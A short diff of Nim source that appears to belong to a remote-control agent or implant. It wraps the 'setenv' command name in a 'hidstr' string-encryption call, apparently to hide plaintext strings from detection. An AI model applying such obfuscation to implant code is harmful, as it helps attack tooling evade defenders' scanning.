@@ -1,6 +1,7 @@
 import std/[os, json, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc setenvExecute(taskId: string, params: JsonNode, state: AgentState,
                    send: SendMsg): TaskResult =
@@ -17,4 +18,4 @@ proc setenvExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initSetenv*() =
-  register("setenv", setenvExecute)
+  register(hidstr("setenv"), setenvExecute)
